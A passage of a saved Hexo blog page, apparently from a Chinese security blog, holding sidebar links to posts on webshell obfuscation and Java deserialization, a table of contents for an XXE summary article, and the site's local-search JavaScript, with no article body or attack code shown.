+                    <a href="https://virusday.github.io/2021/11/22/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E%E7%9A%84%E6%B7%B7%E6%B7%86%E4%B8%8E%E7%AE%80%E5%8D%95%E5%85%8D%E6%9D%80/1/" title="十一月整理的问题/冰蝎的混淆与简单免杀/1" target="_blank">十一月整理的问题/冰蝎的混淆与简单免杀/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="https://virusday.github.io/2021/11/17/%E5%8D%81%E4%B8%80%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/%E5%86%B0%E8%9D%8E3%E6%B5%85%E6%9E%90/1/" title="十一月整理的问题/冰蝎3浅析/1" target="_blank">十一月整理的问题/冰蝎3浅析/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="https://virusday.github.io/2021/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%B0%88/1/" title="java反序列化杂谈/1" target="_blank">java反序列化杂谈/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="https://virusday.github.io/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/" title="十月整理的问题/1" target="_blank">十月整理的问题/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="https://virusday.github.io/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/" title="杂问题/1" target="_blank">杂问题/1</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active" style="opacity: 1; display: block; transform: translateX(0px);">
+          <div class="post-toc" style="max-height: 453px;">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E5%AE%9A%E4%B9%89"><span class="nav-number">1.</span> <span class="nav-text">XML定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">2.</span> <span class="nav-text">XML漏洞存在的地方</span></a></li><li class="nav-item nav-level-2 active"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XML%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">XML注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3 active active-current"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1%E3%80%81python-xxe"><span class="nav-number">3.1.</span> <span class="nav-text">1、python xxe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2%E3%80%81Blind-XXE"><span class="nav-number">3.2.</span> <span class="nav-text">2、Blind XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1%E3%80%81%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%92%8C%E5%86%85%E9%83%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">3.2.1.</span> <span class="nav-text">1、参数实体和内部参数实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2%E3%80%81Blind-XXE%E5%8E%9F%E7%90%86"><span class="nav-number">3.2.2.</span> <span class="nav-text">2、Blind XXE原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#3%E3%80%81%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84XXE%E5%88%A9%E7%94%A8cdata-character-data-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%8C%85%E8%A3%B9"><span class="nav-number">3.3.</span> <span class="nav-text">3、有回显的XXE利用cdata(character data)进行数据包裹</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">新的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#SSRF"><span class="nav-number">4.1.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.1.1.</span> <span class="nav-text">内网主机探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">4.1.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%86%85%E7%BD%91%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%89"><span class="nav-number">4.1.3.</span> <span class="nav-text">内网盲注（强网杯）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">4.1.4.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E9%92%93%E9%B1%BC"><span class="nav-number">4.1.5.</span> <span class="nav-text">钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%85%B6%E4%BB%96%EF%BC%9A"><span class="nav-number">4.1.6.</span> <span class="nav-text">其他：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#1-PHP-expect-RCE"><span class="nav-number">4.1.7.</span> <span class="nav-text">1.PHP expect RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#2-%E5%88%A9%E7%94%A8-XXE-%E8%BF%9B%E8%A1%8C-DOS-%E6%94%BB%E5%87%BB"><span class="nav-number">4.1.8.</span> <span class="nav-text">2. 利用 XXE 进行 DOS 攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#XXE%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="nav-number">5.</span> <span class="nav-text">XXE如何防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="https://virusday.github.io/2020/11/18/XXE%E6%80%BB%E7%BB%93/XXE%E6%80%BB%E7%BB%93/#%E5%90%8E%E8%AF%9D%EF%BC%88%E5%A6%82%E4%BD%95%E5%8E%BB%E6%90%9C%E5%AF%BBxxe%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">后话（如何去搜寻xxe漏洞）</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top back-to-top-on">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>6</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">106.6k</span>
+  
+</div>
+-->
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io/">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/index.js.下载"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/fastclick.min.js.下载"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/jquery.lazyload.js.下载"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/velocity.min.js.下载"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/velocity.ui.min.js.下载"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/jquery.fancybox.pack.js.下载"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/utils.js.下载"></script>
+
+  <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/motion.js.下载"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/scrollspy.js.下载"></script>
+<script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/post-details.js.下载"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="./XXE总结_XXE总结 _ v1rus blog_files/bootstrap.js.下载"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+</body></html>
